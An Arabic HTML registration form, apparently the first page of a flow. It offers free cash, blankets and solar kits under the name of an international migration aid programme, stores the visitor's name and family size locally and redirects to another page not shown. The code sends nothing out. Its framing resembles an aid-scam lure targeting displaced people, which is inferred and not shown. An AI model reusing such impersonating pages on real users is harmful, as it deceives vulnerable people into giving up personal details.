<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة 1 | تسجيل البيانات - المساعدات</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #f0f4f0 0%, #e8f0e5 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem;
        }
        .form-container {
            max-width: 650px;
            width: 100%;
            background: white;
            border-radius: 2rem;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            overflow: hidden;
            border: 1px solid #d4e2c6;
        }
        .header {
            background: #2d6a4f;
            color: white;
            padding: 1.8rem;
            text-align: center;
        }
        .header h1 {
            font-size: 1.8rem;
            margin-bottom: 0.3rem;
        }
        .header p {
            opacity: 0.9;
            font-size: 0.9rem;
        }
        .form-body {
            padding: 2rem;
        }
        .input-group {
            margin-bottom: 1.3rem;
        }
        .input-group label {
            display: block;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: #2d4a2c;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 0.9rem 1rem;
            border-radius: 1rem;
            border: 1.5px solid #c8dbc0;
            font-family: 'Cairo', sans-serif;
            font-size: 1rem;
            transition: 0.2s;
            background: #fefef7;
        }
        .input-group input:focus, .input-group select:focus {
            outline: none;
            border-color: #2d6a4f;
            box-shadow: 0 0 0 3px #a3c9a3;
        }
        .btn-submit {
            background: #2d6a4f;
            color: white;
            width: 100%;
            padding: 1rem;
            border: none;
            border-radius: 2rem;
            font-size: 1.2rem;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 0.5rem;
        }
        .btn-submit:hover {
            background: #1f4f3a;
            transform: scale(0.98);
        }
        .toast-msg {
            visibility: hidden;
            min-width: 280px;
            background: #1f4f3a;
            color: white;
            text-align: center;
            border-radius: 50px;
            padding: 12px 20px;
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            font-weight: bold;
            z-index: 1000;
            opacity: 0;
            transition: 0.3s;
        }
        .toast-msg.show {
            visibility: visible;
            opacity: 1;
        }
        .info-note {
            background: #eef4e8;
            padding: 0.8rem;
            border-radius: 1rem;
            margin-top: 1rem;
            font-size: 0.8rem;
            color: #3a5a3a;
            text-align: center;
        }
    </style>
</head>
<body>
<div class="form-container">
    <div class="header">
        <h1><i class="fas fa-hands-helping"></i> تسجيل المستفيدين</h1>
        <p>برنامج الهجرة الدولية - المساعدات المجانية</p>
    </div>
    <div class="form-body">
        <form id="registerForm">
            <div class="input-group">
                <label><i class="fas fa-user"></i> الاسم الكامل</label>
                <input type="text" id="fullName" placeholder="أدخل الاسم الثلاثي" required>
            </div>
            <div class="input-group">
                <label><i class="fas fa-users"></i> عدد أفراد العائلة</label>
                <input type="number" id="familyCount" min="1" max="20" placeholder="مثال: 5" required>
            </div>
            <div class="input-group">
                <label><i class="fas fa-gift"></i> نوع المساعدة المطلوبة</label>
                <select id="aidRequest" required>
                    <option value="all">الحزمة المتكاملة (قروش + بطاطين + شمسية)</option>
                    <option value="cash">قروش نقدية فقط</option>
                    <option value="blanket">بطاطين فقط</option>
                    <option value="solar">طاقة شمسية فقط</option>
                </select>
            </div>
            <button type="submit" class="btn-submit"><i class="fas fa-paper-plane"></i> تسجيل البيانات والمتابعة</button>
        </form>
        <div class="info-note">
            <i class="fas fa-shield-alt"></i> بعد تسجيل البيانات، سيتم توجيهك إلى صفحة تفاصيل المساعدات.
        </div>
    </div>
</div>
<div id="toastMsg" class="toast-msg">✅ تم تسجيل البيانات بنجاح! جاري التوجيه...</div>

<script>
    const form = document.getElementById('registerForm');
    const toast = document.getElementById('toastMsg');

    function showMessage(msg, isError = false) {
        toast.textContent = msg || "✅ تم تسجيل البيانات بنجاح!";
        toast.style.background = isError ? "#b4432c" : "#1f4f3a";
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
        }, 2500);
    }

    // حفظ البيانات في localStorage والتوجيه إلى 00.html
    function saveDataAndRedirect(userData) {
        // حفظ البيانات في localStorage للصفحة التالية
        localStorage.setItem('aid_user_data', JSON.stringify(userData));
        console.log("✅ تم حفظ البيانات:", userData);
        return true;
    }

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const fullName = document.getElementById('fullName').value.trim();
        const familyCount = parseInt(document.getElementById('familyCount').value);
        const aidRequest = document.getElementById('aidRequest').value;
        
        if (!fullName || !familyCount || !aidRequest) {
            showMessage("⚠️ الرجاء ملء جميع الحقول", true);
            return;
        }
        
        if (familyCount < 1 || familyCount > 20) {
            showMessage("👨‍👩‍👧 عدد أفراد العائلة غير صحيح (1-20)", true);
            return;
        }
        
        // تحديد نص نوع المساعدة
        let aidTypeText = "";
        switch(aidRequest) {
            case 'cash': aidTypeText = "قروش نقدية"; break;
            case 'blanket': aidTypeText = "بطاطين شتوية"; break;
            case 'solar': aidTypeText = "نظام طاقة شمسية"; break;
            default: aidTypeText = "حزمة متكاملة (قروش + بطاطين + شمسية)";
        }
        
        const userData = {
            fullName: fullName,
            familyCount: familyCount,
            aidType: aidRequest,
            aidTypeText: aidTypeText,
            timestamp: new Date().toLocaleString('ar-EG')
        };
        
        // حفظ البيانات والتوجيه إلى 00.html
        const saved = saveDataAndRedirect(userData);
        if(saved) {
            showMessage("✅ تم تسجيل بياناتك بنجاح! جاري التحويل...");
            setTimeout(() => {
                window.location.href = "00.html";
            }, 1500);
        } else {
            showMessage("حدث خطأ، حاول مرة أخرى", true);
        }
    });
</script>
</body>
</html>
